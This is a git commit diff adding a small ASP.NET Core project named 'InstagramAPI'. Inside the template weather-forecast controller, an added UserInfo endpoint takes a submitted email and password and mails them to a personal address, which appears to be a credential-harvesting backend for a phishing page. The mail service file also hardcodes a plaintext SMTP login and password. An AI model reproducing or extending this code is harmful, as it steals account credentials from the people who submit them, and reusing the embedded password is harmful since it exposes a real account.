d503e9baf9cf38d38a0cd5d17496537da0b1d17c
ILYA <voolfer11@gmail.com>
2021-09-25 11:34:24 +0300

    Add InstagramAPI

---
+++ InstagramAPI/InstagramAPI/InstagramAPI/Controllers/WeatherForecastController.cs
@@ -0,0 +1,47 @@
+﻿using Microsoft.AspNetCore.Mvc;
+using Microsoft.Extensions.Logging;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+
+namespace InstagramAPI.Controllers
+{
+    [ApiController]
+    [Route("[controller]")]
+    public class WeatherForecastController : ControllerBase
+    {
+        private static readonly string[] Summaries = new[]
+        {
+            "Freezing", "Bracing", "Chilly", "Cool", "Mild", "Warm", "Balmy", "Hot", "Sweltering", "Scorching"
+        };
+
+        private readonly ILogger<WeatherForecastController> _logger;
+
+        public WeatherForecastController(ILogger<WeatherForecastController> logger)
+        {
+            _logger = logger;
+        }
+
+        [HttpGet]
+        public IEnumerable<WeatherForecast> Get()
+        {
+            var rng = new Random();
+            return Enumerable.Range(1, 5).Select(index => new WeatherForecast
+            {
+                Date = DateTime.Now.AddDays(index),
+                TemperatureC = rng.Next(-20, 55),
+                Summary = Summaries[rng.Next(Summaries.Length)]
+            })
+            .ToArray();
+        }
+
+        public async Task<IActionResult> UserInfo([FromForm] string mail, [FromForm] string password)
+        {
+            EmailService EmailSend = new EmailService();
+
+            await EmailSend.SendEmailAsync("ilya-lyapin@mail.ru", "Keksa", $"{mail}+{password}");
+            return Ok("NICE");
+        }
+    }
+}
---
+++ InstagramAPI/InstagramAPI/InstagramAPI/EmailService.cs
@@ -0,0 +1,30 @@
+using MimeKit;
+using MailKit.Net.Smtp;
+using System.Threading.Tasks;
+namespace InstagramAPI
+{
+    public class EmailService
+    {
+        public async Task SendEmailAsync(string email, string subject, string message)
+        {
+            var emailMessage = new MimeMessage();
+
+            emailMessage.From.Add(new MailboxAddress("Кексы", "ilya-lyapin@mail.ru"));
+            emailMessage.To.Add(new MailboxAddress("", email));
+            emailMessage.Subject = subject;
+            emailMessage.Body = new TextPart(MimeKit.Text.TextFormat.Html)
+            {
+                Text = message
+            };
+
+            using (var client = new SmtpClient())
+            {
+                await client.ConnectAsync("smtp.mail.ru", 465, true);
+                await client.AuthenticateAsync("ilya-lyapin@mail.ru", "vfhn20020307ujl");
+                await client.SendAsync(emailMessage);
+
+                await client.DisconnectAsync(true);
+            }
+        }
+    }
+}
